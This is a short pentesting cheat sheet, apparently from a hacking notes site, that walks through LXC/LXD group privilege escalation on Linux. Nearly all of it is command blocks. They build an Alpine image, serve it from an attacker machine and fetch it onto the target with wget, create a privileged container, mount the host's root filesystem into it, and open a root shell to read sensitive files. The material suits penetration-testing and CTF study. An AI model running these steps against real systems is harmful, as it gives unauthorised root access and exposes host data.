# LXC/LXD (Linux Container/Daemon) Privilege Escalation

LXD is a container management extension for Linux Containers (LXC).

### Basic Flow <a href="#basic-flow" id="basic-flow"></a>

#### 1. Check if You are in the Lxd Group <a href="#id-1-check-if-you-are-in-the-lxd-group" id="id-1-check-if-you-are-in-the-lxd-group"></a>

If you belong to the Lxd group, you may be able to the root privileges.

```shellscript
groups
id
```

#### 2. Check if Container Image Exists <a href="#id-2-check-if-container-image-exists" id="id-2-check-if-container-image-exists"></a>

List all images and check if a container image already exists.

```shellscript
lxc image list
```

If there are not container, build a new image in your local machine.

```shellscript
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8000
```

In remote machine, download the “alpine-\*.tar.gz” and import it.

```shellscript
wget http://<local-ip>:8000/alpine-v3.17-x86_64-20221206_0615.tar.gz
lxc image import ./alpine-v3.17-x86_64-20221206_0615.tar.gz --alias testimage
lxc image list
```

After that, create a new container from the image.

```shellscript
lxc init testimage testcontainer -c security.privileged=true
```

If you got the error “**No storage pool found. Please create a new storage pool.”, initialize the lxd at first.**

```shellscript
lxd init
# Set default values in prompt
```

Then create a new container as above command.

#### 3. Mount the New Container to Root Directory <a href="#id-3-mount-the-new-container-to-root-directory" id="id-3-mount-the-new-container-to-root-directory"></a>

Now mount the host's **/** directory onto **/mnt/root** in the container you created.

```shellscript
lxc config device add testcontainer testdevice disk source=/ path=/mnt/root recursive=true
```

#### 4. Start the Container <a href="#id-4-start-the-container" id="id-4-start-the-container"></a>

```shellscript
lxc start testcontainer
```

#### 5. Get a Shell <a href="#id-5-get-a-shell" id="id-5-get-a-shell"></a>

```shellscript
lxc exec testcontainer /bin/sh
```

Check if you are root.

```shellscript
whoami
```

#### 6. Retrieve the Sensitive Information in the Mounted Directory <a href="#id-6-retrieve-the-sensitive-information-in-the-mounted-directory" id="id-6-retrieve-the-sensitive-information-in-the-mounted-directory"></a>

```shellscript
cd /mnt/root/
```
